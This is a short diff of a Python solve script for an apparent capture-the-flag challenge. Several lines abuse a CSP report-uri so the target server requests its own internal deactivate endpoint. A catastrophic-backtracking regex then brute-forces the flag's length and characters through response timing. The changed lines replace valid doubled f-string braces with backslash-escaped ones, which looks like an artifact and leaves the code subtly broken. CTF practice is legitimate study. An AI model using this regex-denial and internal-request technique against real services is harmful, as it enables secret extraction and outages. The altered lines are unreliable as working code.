@@ -116,7 +116,7 @@ url = "http://178.128.174.134:32093/api/evaluate"
 def brute_flag():
     length_of_flag = 0
     for i in range(100):
-        secret_code = urllib.parse.quote_plus(f'^(?=HTB{{.{{{i}}}}})((.*)*)*salt$')
+        secret_code = urllib.parse.quote_plus(f'^(?=HTB\{\{.\{\{\{i\}\}\}\}\})((.*)*)*salt$')
 
         headers = {'Content-Type': 'application/json'}
         data = {'csp': f'report-uri http://127.1:1337/deactivate?secretCode={secret_code}\n'}
@@ -147,7 +147,7 @@ def brute_force_flag():
     flag = ""
     for i in range(34):
         for i in range(len(alphabet)):
-            secret_code = urllib.parse.quote_plus(f'^(?=HTB{{{flag}{alphabet[i]}.*}})((.*)*)*salt$')
+            secret_code = urllib.parse.quote_plus(f'^(?=HTB\{\{\{flag\}\{alphabet[i]\}.*\}\})((.*)*)*salt$')
 
             headers = {'Content-Type': 'application/json'}
             data = {'csp': f'report-uri http://127.1:1337/deactivate?secretCode={secret_code}\n'}
